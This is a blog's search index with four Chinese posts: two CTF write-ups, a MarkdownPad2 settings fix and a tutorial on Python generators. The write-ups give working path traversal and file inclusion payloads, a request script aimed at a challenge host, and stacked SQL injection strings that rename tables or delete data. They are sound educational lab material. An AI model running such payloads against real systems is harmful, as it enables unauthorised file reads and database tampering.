<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>安恒2020七月月赛</title>
      <link href="/2020/08/02/an-heng-2020-qi-yue-yue-sai/"/>
      <url>/2020/08/02/an-heng-2020-qi-yue-yue-sai/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Ezfileinclude"><a href="#Ezfileinclude" class="headerlink" title="Ezfileinclude"></a>Ezfileinclude</h2><p><a href="http://183.129.189.60:10012/image.php?t=1596551067&amp;f=Z3F5LmpwZw==">http://183.129.189.60:10012/image.php?t=1596551067&amp;f=Z3F5LmpwZw==</a></p><p>点开后发现是png的图片二进制，<code>Z3F5LmpwZw==</code>base64解码为gqy.jpg，可见为文件包含，分析得</p><p>t参数为时间戳（如果不知道参数的含义也没关系，直接正则匹配获取即可），会根据时间正确与否判断是否包含</p><p>脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> base64<span class="token comment" spellcheck="true">#res=requests.get("http://183.129.189.60:10009/index.php")</span><span class="token comment" spellcheck="true">#p=re.findall(r"t=(.+?)&amp;f",res.text)  也可正则匹配实时获取时间戳</span>order<span class="token operator">=</span><span class="token string">"/gqy.jpg"</span>order<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>order<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>url<span class="token operator">=</span><span class="token string">"http://183.129.189.60:10012/image.php?t="</span><span class="token operator">+</span>str<span class="token punctuation">(</span>int<span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"&amp;f="</span><span class="token operator">+</span>orderres<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>发现返回的内容与之前一致，说明拼接了目录。</p><p>将order=”../../../../../../etc/passwd”，返回<code>You are not allowed to do that.</code>，说明有waf。</p><p>waf过滤了../，导致了目录穿越不可用，也就无法读到其他源码和flag</p><p>后面看wp才发现这waf写的真奇葩，只验证前个字符，那只要将前几个随便写就行</p><p>order=”abcd/../../../../../../flag”，得flag: <code>flag&#123;847d2f93276a21f084c44f4d74c61ef4&#125;</code></p><p>读取源码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"you miss some parameters"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$timestamp</span> <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'t'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token variable">$timestamp</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token string">"what's your time?"</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'f'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"/../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"/../"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"../"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"../"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"./"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"./"</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token string">"/."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">"/."</span> <span class="token operator">||</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>"<span class="token comment" spellcheck="true">//")) === "//") &amp;#123;</span>        <span class="token keyword">echo</span> <span class="token string">'You are not allowed to do that.'</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">else</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">'/var/www/html/img/'</span><span class="token punctuation">.</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span><span class="token delimiter">?></span></code></pre><h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p><img src="../../../../medias/img/image-20200804224730946.png" alt="image-20200804224730946"></p><p>一直试不出来，先占坑</p><p>（无列名注入+<code>sys.x$schema_flattened_keys</code>来绕过<code>information_schema</code>）</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuoj刷题记录</title>
      <link href="/2020/07/20/buuoj-shua-ti-ji-lu/"/>
      <url>/2020/07/20/buuoj-shua-ti-ji-lu/</url>
      
        <content type="html"><![CDATA[<h1 id="Buuoj刷题记录"><a href="#Buuoj刷题记录" class="headerlink" title="Buuoj刷题记录"></a>Buuoj刷题记录</h1><p>记录buuoj写过的题</p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h3><p>F12看到存在source.php，跳转后看到代码</p><pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; else &amp;#123;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;  </span><span class="token delimiter">?></span></code></pre><p>可以看到考点为文件包含，传入的file参数先会检查是否在白名单中，第二个是检查传入的字符串中‘?’前的字符串是否在白名单中，第三个是先进行url解码再截取，其实可以直接第二个就构造payload得到flag</p><blockquote><p>Payload:</p><p><a href="http://f5c2ee8f-ee5f-4469-bad8-86c15a958352.node3.buuoj.cn/source.php?file=hint.php?/../../../../../ffffllllaaaagggg">http://f5c2ee8f-ee5f-4469-bad8-86c15a958352.node3.buuoj.cn/source.php?file=hint.php?/../../../../../ffffllllaaaagggg</a></p></blockquote><p><img src="../../../../medias/img/image-20200723140717985.png" alt="image-20200723140717985"></p><p>截取通过后，include会将hint.php?/ 作为目录，然后不断前转目录，到根目录包含ffffllllaaaagggg<br>也有的情况?后会被解析为get提交的参数，此时可将’?’进行二次url编码。</p><h3 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h3><p>（sqlmap仅能跑出库名，表名为空）</p><p>先使用 1’ or 1=1–+ 发现存在注入</p><p><img src="../../../../medias/img/image-20200723140943242.png" alt="image-20200723140943242"></p><p>加’后报错，然后order by猜出字段为2，union select 1,2 后返回：<br>return preg_match(“/select|update|delete|drop|insert|where|./i”,$inject);<br>发现过滤了常用词。</p><p>使用堆叠注入：</p><blockquote><p>在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。</p></blockquote><p>1’;show tables;–+ //查看表名</p><p><img src="../../../../medias/img/image-20200723141207481.png" alt="image-20200723141207481"></p><p>  ?inject=1’;show columns from `1919810931114514`;–+</p><p>  ?inject=1’;show columns from `words`;–+</p><p>（要在表名加``否则无回显）</p><p>MySQL中反引号和单引号的区别与用法:</p><blockquote><ol><li><p>MySql 中用一对反引号来标注 SQL 语句中的标识，如<strong>数据库名、表名、字段名</strong>等</p></li><li><p>引号用来标注语句中所引用的字符型常量或时间型常量，即<strong>字段值</strong></p></li><li><p>例如：select * from `username` where `name`=”name”</p></li></ol></blockquote><p><img src="../../../../medias/img/image-20200723141506549.png" alt="image-20200723141506549"></p><p><img src="../../../../medias/img/image-20200723141516510.png" alt="image-20200723141516510"></p><p>可以看到flag在1919810931114514中<br>因为语句被过滤严重，但并为过滤改名语句，所以思路是借助本身查询语句，也就是将1919810931114514改名为words，将flag改为id</p><p>/?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag<code> </code>id` VARCHAR(100);–+</p><p>(搜寻中看到有可能修改失败，所以有另一语句：/?inject=1’;RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;–+</p><p>)</p><p>改完后输入：1’ or 1=1 –+即可查到flag</p><p><img src="../../../../medias/img/image-20200723141800578.png" alt="image-20200723141800578"></p><p>堆叠注入：<a href="https://www.cnblogs.com/0nth3way/articles/7128189.html">https://www.cnblogs.com/0nth3way/articles/7128189.html</a></p><h3 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h3><p><img src="../../../../medias/img/image-20200723141847958.png" alt="image-20200723141847958"></p><p>三种查询结果：</p><p><img src="../../../../medias/img/clip_image002.jpg" alt="img"></p><p><img src="../../../../medias/img/clip_image004.jpg" alt="img"></p><p><img src="../../../../medias/img/clip_image006.jpg" alt="img"></p><p><img src="../../../../medias/img/clip_image008.jpg" alt="img"></p><p>可堆叠注入：1;show databases; show tables;</p><p>网上搜到原题泄露了查询语句：<code>select $_POST[query] || flag from flag</code></p><p>两种方法：</p><ol><li><p>*,1</p></li><li><p>1;set sql_mode=PIPES_AS_CONCAT;select 1</p></li></ol><p>解析：</p><ul><li>在oracle 缺省支持     通过 ‘ || ’ 来实现字符串拼接。</li><li>但在mysql 缺省不支持。需要调整mysql 的sql_mode模式：pipes_as_concat 来实现oracle     的一些功能。</li></ul><p>参考：<a href="https://blog.csdn.net/qq_42158602/article/details/103930598">https://blog.csdn.net/qq_42158602/article/details/103930598</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 题解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决Markdownpad2插入多行代码问题</title>
      <link href="/2020/01/20/jie-jue-markdownpad2-cha-ru-duo-xing-dai-ma-wen-ti/"/>
      <url>/2020/01/20/jie-jue-markdownpad2-cha-ru-duo-xing-dai-ma-wen-ti/</url>
      
        <content type="html"><![CDATA[<p>用Markdownpad2写博客时换行总是要用<code>&lt;p&gt;</code>,并且插入多行代码时特别不方便，以为本就是这么麻烦，后面 才发现原来是设置的问题</p><blockquote><p>ps: 主力已换typora，建议直接typora，markdowndpad2需要额外安装插件，并且占用内存较大，对表格和图片等插入的支持较弱。</p></blockquote><h1 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h1><p>工具=&gt;选项=&gt;Markdown<br><img src="https://s2.ax1x.com/2020/01/20/1iUDhV.png"><br>选择<strong>Github风格Markdown（离线）</strong>即可<br>然后编写就极为方便了</p>]]></content>
      
      
      <categories>
          
          <category> 小问题 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python中的yield</title>
      <link href="/2020/01/20/python-zhong-de-yield/"/>
      <url>/2020/01/20/python-zhong-de-yield/</url>
      
        <content type="html"><![CDATA[<p>讲到yield就要先说一下生成器：在Python中，一边循环一边计算的机制，称为生成器：generator。<br>也就是说，它并不是一回计算货创建出所有目标，而是有需要的适合再计算创建，作用就是减少内存占用。</p><h1 id="创建生成器"><a href="#创建生成器" class="headerlink" title="创建生成器"></a>创建生成器</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>把一个列表生成式的[]改成()：</p><pre><code>&gt;&gt;&gt; L = [x * x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x1022ef630&gt;</code></pre><p>可以看出L是一个list，而g是一个generator<br>可以通过next()函数获得g的下一个返回值：</p><pre><code>&gt;&gt;&gt; next(g)0&gt;&gt;&gt; next(g)1&gt;&gt;&gt; next(g)4&gt;&gt;&gt; next(g)9</code></pre><p>或者直接利用循环：</p><pre><code>&gt;&gt;&gt; for n in g:...     print(n)... 0149162536496481</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>在函数中使用yield，如果一个函数中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个generator。调用函数就是创建了一个生成器（generator）对象。</p><h1 id="关键字yield"><a href="#关键字yield" class="headerlink" title="关键字yield"></a>关键字yield</h1><p>yield相当于 return 返回一个值，并且记住这个返回的位置，下次迭代时，代码从yield的下一条语句开始执行。<br>我们可以暂时将它理解为return，当程序遇到他时返回特定值，然后程序暂停运行。</p><h2 id="EX"><a href="#EX" class="headerlink" title="EX:"></a>EX:</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token number">3</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果：</p><blockquote><p>3</p></blockquote><p>那我们在加一个<code>print(next(a))</code>呢</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token number">3</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果</p><blockquote><p>3<br>test<br>3</p></blockquote><p>结果符合上面描述</p><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><p>当我们处理数据时，生成器就用的比较多了<br>比如我们写一个爬虫，返回处理后的数据保存为文件时，就可以使用生成器，利用循环依次返回并写入数据</p><h2 id="EX-1"><a href="#EX-1" class="headerlink" title="EX:"></a>EX:</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#解析数据函数</span><span class="token keyword">def</span> <span class="token function">parse_result</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token string">'1'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'2'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'3'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span class="token keyword">def</span> <span class="token function">write_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#省略函数内容</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求</span>items1 <span class="token operator">=</span> parse_result<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#调用解析函数</span><span class="token comment" spellcheck="true">#main（）区</span><span class="token keyword">for</span> item <span class="token keyword">in</span> items1<span class="token punctuation">:</span>    write_file<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将内容写入文件</span></code></pre><p>items1是一个生成器，在main（）区中通过for循环一步步返回数据到item中，然后载写入文件中<br>若把yield换成return就不可行了，return返回一次函数就结束了。</p><h4 id="return与yield的区别："><a href="#return与yield的区别：" class="headerlink" title="return与yield的区别："></a>return与yield的区别：</h4><blockquote><p>1，return只能返回一次函数就彻底结束了。而yield能返回多次值。<br>2，yield把函数变成生成器—迭代器—&gt;把iter，next方法给到函数了。为我们自己定义迭代器，提供了方便。<br>3，yield能保存函数在暂停，和继续下一次运行的状态。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
